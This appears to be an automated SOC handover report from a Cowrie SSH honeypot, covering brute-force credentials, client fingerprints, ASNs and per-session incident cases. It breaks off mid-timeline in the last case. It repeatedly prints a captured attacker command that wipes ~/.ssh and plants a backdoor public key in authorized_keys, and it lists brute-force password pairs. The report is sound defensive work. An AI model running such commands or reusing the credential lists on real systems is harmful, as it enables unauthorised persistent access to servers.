# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-27 |
| **Generated At** | 2026-05-27T13:38:52Z |
| **Shift Time** | 13:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **130** |
| Confirmed Threats | **100** |
| False Positives Filtered | **30** (23.1%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **13** |
| High Severity Cases | **26** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **104** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **68** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **23** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 26 |
| `345gs5662d34` | 13 |
| `ubuntu` | 5 |
| `systemd` | 4 |
| `steam` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `Voidsetdownload.so` | 4 |
| `fjbdfdjkdsfs541544AA@@` | 3 |
| `123456` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `systemd` | `Voidsetdownload.so` | 4 |
| `ubuntu` | `fjbdfdjkdsfs541544AA@@` | 3 |
| `testuser` | `123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwerty1` | `34.91.0.68` | 2026-05-27T11:25:48 |
| `root` | `3245gs5662d34` | `34.91.0.68` | 2026-05-27T11:25:52 |
| `root` | `s` | `34.91.0.68` | 2026-05-27T11:27:04 |
| `root` | `qwer@2026` | `34.91.0.68` | 2026-05-27T11:33:31 |
| `root` | `Password123!` | `101.36.106.162` | 2026-05-27T12:09:50 |
| `root` | `3245gs5662d34` | `101.36.106.162` | 2026-05-27T12:09:53 |
| `root` | `Qazxsw123` | `115.190.162.240` | 2026-05-27T13:05:59 |
| `root` | `3245gs5662d34` | `115.190.162.240` | 2026-05-27T13:06:03 |
| `root` | `1234!@#$qwerQWER` | `189.147.19.238` | 2026-05-27T13:14:01 |
| `root` | `3245gs5662d34` | `189.147.19.238` | 2026-05-27T13:14:08 |
| `root` | `root1` | `189.147.19.238` | 2026-05-27T13:18:58 |
| `root` | `Admin123$` | `189.147.19.238` | 2026-05-27T13:20:44 |
| `root` | `!@#QWE123` | `101.36.108.213` | 2026-05-27T13:24:30 |
| `root` | `Master2023` | `189.147.19.238` | 2026-05-27T13:24:31 |
| `root` | `3245gs5662d34` | `101.36.108.213` | 2026-05-27T13:24:33 |
| `root` | `Linux@123` | `101.36.108.213` | 2026-05-27T13:26:02 |
| `root` | `Redhat` | `101.36.108.213` | 2026-05-27T13:29:09 |
| `root` | `a123456@` | `101.36.108.213` | 2026-05-27T13:30:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **130** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 73 |
| Go SSH scanner | 3 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 66 | 6 |
| `03a80b21afa8...` | Modern SSH client | 6 | 4 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 66 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 4 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.91.0.68`, `101.36.108.213`, `189.147.19.238`, `115.190.162.240`, `101.36.106.162`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **26** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | MEDIUM |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS51200` | LLC Digital Dialogue-Nets | 1 | MEDIUM |
| `AS56040` | China Mobile communications corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (26)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-798247f756aa

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-05-27 11:25 |
| **Last Seen** | 2026-05-27 11:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 11:25:47` | `cowrie.session.connect` |
| `2026-05-27 11:25:47` | `cowrie.client.version` |
| `2026-05-27 11:25:48` | `cowrie.client.kex` |
| `2026-05-27 11:25:48` | `cowrie.login.success` |
| `2026-05-27 11:25:48` | `cowrie.session.params` |
| `2026-05-27 11:25:48` | `cowrie.command.input` |
| `2026-05-27 11:25:48` | `cowrie.command.failed` |
| `2026-05-27 11:25:49` | `cowrie.log.closed` |
| `2026-05-27 11:25:49` | `cowrie.session.params` |
| `2026-05-27 11:25:49` | `cowrie.command.input` |
| `2026-05-27 11:25:49` | `cowrie.session.file_download` |
| `2026-05-27 11:25:49` | `cowrie.log.closed` |
| `2026-05-27 11:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6de55ce833

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-05-27 11:25 |
| **Last Seen** | 2026-05-27 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 11:25:51` | `cowrie.session.connect` |
| `2026-05-27 11:25:51` | `cowrie.client.version` |
| `2026-05-27 11:25:51` | `cowrie.client.kex` |
| `2026-05-27 11:25:52` | `cowrie.login.success` |
| `2026-05-27 11:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-209136c1aecf

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-05-27 11:27 |
| **Last Seen** | 2026-05-27 11:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 11:27:03` | `cowrie.session.connect` |
| `2026-05-27 11:27:03` | `cowrie.client.version` |
| `2026-05-27 11:27:03` | `cowrie.client.kex` |
| `2026-05-27 11:27:04` | `cowrie.login.success` |
| `2026-05-27 11:27:04` | `cowrie.session.params` |
| `2026-05-27 11:27:04` | `cowrie.command.input` |
| `2026-05-27 11:27:04` | `cowrie.command.failed` |
| `2026-05-27 11:27:04` | `cowrie.log.closed` |
| `2026-05-27 11:27:04` | `cowrie.session.params` |
| `2026-05-27 11:27:04` | `cowrie.command.input` |
| `2026-05-27 11:27:05` | `cowrie.session.file_download` |
| `2026-05-27 11:27:05` | `cowrie.log.closed` |
| `2026-05-27 11:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e83661165b

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-05-27 11:27 |
| **Last Seen** | 2026-05-27 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 11:27:07` | `cowrie.session.connect` |
| `2026-05-27 11:27:07` | `cowrie.client.version` |
| `2026-05-27 11:27:07` | `cowrie.client.kex` |
| `2026-05-27 11:27:07` | `cowrie.login.success` |
| `2026-05-27 11:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b9995619c8e

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-05-27 11:33 |
| **Last Seen** | 2026-05-27 11:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 11:33:30` | `cowrie.session.connect` |
| `2026-05-27 11:33:30` | `cowrie.client.version` |
| `2026-05-27 11:33:30` | `cowrie.client.kex` |
| `2026-05-27 11:33:31` | `cowrie.login.success` |
| `2026-05-27 11:33:31` | `cowrie.session.params` |
| `2026-05-27 11:33:31` | `cowrie.command.input` |
| `2026-05-27 11:33:31` | `cowrie.command.failed` |
| `2026-05-27 11:33:31` | `cowrie.log.closed` |
| `2026-05-27 11:33:32` | `cowrie.session.params` |
| `2026-05-27 11:33:32` | `cowrie.command.input` |
| `2026-05-27 11:33:32` | `cowrie.session.file_download` |
| `2026-05-27 11:33:32` | `cowrie.log.closed` |
| `2026-05-27 11:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e8addf7993

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-05-27 11:33 |
| **Last Seen** | 2026-05-27 11:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 11:33:34` | `cowrie.session.connect` |
| `2026-05-27 11:33:34` | `cowrie.client.version` |
| `2026-05-27 11:33:34` | `cowrie.client.kex` |
| `2026-05-27 11:33:35` | `cowrie.login.success` |
| `2026-05-27 11:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b363e3d2fd9

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-27 12:09 |
| **Last Seen** | 2026-05-27 12:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 12:09:50` | `cowrie.session.connect` |
| `2026-05-27 12:09:50` | `cowrie.client.version` |
| `2026-05-27 12:09:50` | `cowrie.client.kex` |
| `2026-05-27 12:09:50` | `cowrie.login.success` |
| `2026-05-27 12:09:50` | `cowrie.session.params` |
| `2026-05-27 12:09:50` | `cowrie.command.input` |
| `2026-05-27 12:09:50` | `cowrie.command.failed` |
| `2026-05-27 12:09:51` | `cowrie.log.closed` |
| `2026-05-27 12:09:51` | `cowrie.session.params` |
| `2026-05-27 12:09:51` | `cowrie.command.input` |
| `2026-05-27 12:09:51` | `cowrie.session.file_download` |
| `2026-05-27 12:09:51` | `cowrie.log.closed` |
| `2026-05-27 12:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d2151964699

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-27 12:09 |
| **Last Seen** | 2026-05-27 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 12:09:53` | `cowrie.session.connect` |
| `2026-05-27 12:09:53` | `cowrie.client.version` |
| `2026-05-27 12:09:53` | `cowrie.client.kex` |
| `2026-05-27 12:09:53` | `cowrie.login.success` |
| `2026-05-27 12:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e449477a2079

| Field | Detail |
|---|---|
| **Source IP** | `115.190.162[.]240` |
| **First Seen** | 2026-05-27 13:05 |
| **Last Seen** | 2026-05-27 13:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:05:58` | `cowrie.session.connect` |
| `2026-05-27 13:05:58` | `cowrie.client.version` |
| `2026-05-27 13:05:58` | `cowrie.client.kex` |
| `2026-05-27 13:05:59` | `cowrie.login.success` |
| `2026-05-27 13:05:59` | `cowrie.session.params` |
| `2026-05-27 13:05:59` | `cowrie.command.input` |
| `2026-05-27 13:05:59` | `cowrie.command.failed` |
| `2026-05-27 13:05:59` | `cowrie.log.closed` |
| `2026-05-27 13:05:59` | `cowrie.session.params` |
| `2026-05-27 13:05:59` | `cowrie.command.input` |
| `2026-05-27 13:06:00` | `cowrie.session.file_download` |
| `2026-05-27 13:06:00` | `cowrie.log.closed` |
| `2026-05-27 13:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.162[.]240` to AbuseIPDB if not already reported
- [ ] Block `115.190.162[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5cd486be05

| Field | Detail |
|---|---|
| **Source IP** | `115.190.162[.]240` |
| **First Seen** | 2026-05-27 13:06 |
| **Last Seen** | 2026-05-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:06:02` | `cowrie.session.connect` |
| `2026-05-27 13:06:02` | `cowrie.client.version` |
| `2026-05-27 13:06:02` | `cowrie.client.kex` |
| `2026-05-27 13:06:03` | `cowrie.login.success` |
| `2026-05-27 13:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.162[.]240` to AbuseIPDB if not already reported
- [ ] Block `115.190.162[.]240` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4251d5f89392

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:14 |
| **Last Seen** | 2026-05-27 13:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:14:00` | `cowrie.session.connect` |
| `2026-05-27 13:14:00` | `cowrie.client.version` |
| `2026-05-27 13:14:00` | `cowrie.client.kex` |
| `2026-05-27 13:14:01` | `cowrie.login.success` |
| `2026-05-27 13:14:02` | `cowrie.session.params` |
| `2026-05-27 13:14:02` | `cowrie.command.input` |
| `2026-05-27 13:14:02` | `cowrie.command.failed` |
| `2026-05-27 13:14:02` | `cowrie.log.closed` |
| `2026-05-27 13:14:03` | `cowrie.session.params` |
| `2026-05-27 13:14:03` | `cowrie.command.input` |
| `2026-05-27 13:14:03` | `cowrie.session.file_download` |
| `2026-05-27 13:14:03` | `cowrie.log.closed` |
| `2026-05-27 13:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bec303f13ac

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:14 |
| **Last Seen** | 2026-05-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:14:06` | `cowrie.session.connect` |
| `2026-05-27 13:14:06` | `cowrie.client.version` |
| `2026-05-27 13:14:07` | `cowrie.client.kex` |
| `2026-05-27 13:14:08` | `cowrie.login.success` |
| `2026-05-27 13:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec58d5547738

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:18 |
| **Last Seen** | 2026-05-27 13:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:18:57` | `cowrie.session.connect` |
